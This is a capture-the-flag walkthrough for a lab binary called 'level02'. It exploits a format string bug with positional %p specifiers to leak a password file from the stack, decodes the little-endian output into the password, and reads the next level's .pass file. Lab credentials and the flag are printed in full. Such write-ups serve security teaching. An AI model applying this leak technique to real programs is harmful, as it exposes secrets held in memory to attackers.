# Walkthrough

## 1. Download the binary

```bash
scp -P 2222 level02@localhost:~/level02 .
# Password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

## 2. Analyze with Ghidra

Open the binary in Ghidra and examine the `main` function.

## 3. Identify the vulnerability

**Format String Bug:**
```c
printf(username);  // Username printed directly without format specifier!
puts(" does not have access!");
```

**Password in Memory:**
The program reads `/home/users/level03/.pass` into a stack buffer (`password_file` at `[RBP - 0xa0]`) before prompting for user input.

## 4. Leak the password from stack

The username buffer is at `[RBP - 0x70]`, and the password file buffer is at `[RBP - 0xa0]`, which is 48 bytes (0x30) above the username on the stack.

### Connect to the VM

```bash
ssh level02@localhost -p 2222
# Password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

### Use format specifiers to dump stack

```bash
./level02
# Username: %22$p %23$p %24$p %25$p %26$p
# Password: anything
```

**Output:**
```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
```

## 5. Decode the leaked password

Each leaked value is 8 bytes in **little-endian** format. Convert to ASCII:

| Position | Hex Value | Bytes (Little-Endian) | ASCII |
|----------|-----------|----------------------|-------|
| 22 | `0x756e505234376848` | `48 68 37 34 52 50 6e 75` | `Hh74RPnu` |
| 23 | `0x45414a3561733951` | `51 39 73 61 35 4a 41 45` | `Q9sa5JAE` |
| 24 | `0x377a7143574e6758` | `58 67 4e 57 43 71 7a 37` | `XgNWCqz7` |
| 25 | `0x354a35686e475873` | `73 58 47 6e 68 35 4a 35` | `sXGnh5J5` |
| 26 | `0x48336750664b394d` | `4d 39 4b 66 50 67 33 48` | `M9KfPg3H` |

**Complete password:** `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

## 6. Authenticate with leaked password

```bash
./level02
# Username: anything
# Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

**Output:**
```
Greetings, anything!
$
```

## 7. Get the flag

```bash
cat /home/users/level03/.pass
```

## 8. Flag

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

**Note:** The flag is the same as the leaked password because we directly leaked the contents of `/home/users/level03/.pass` from memory!
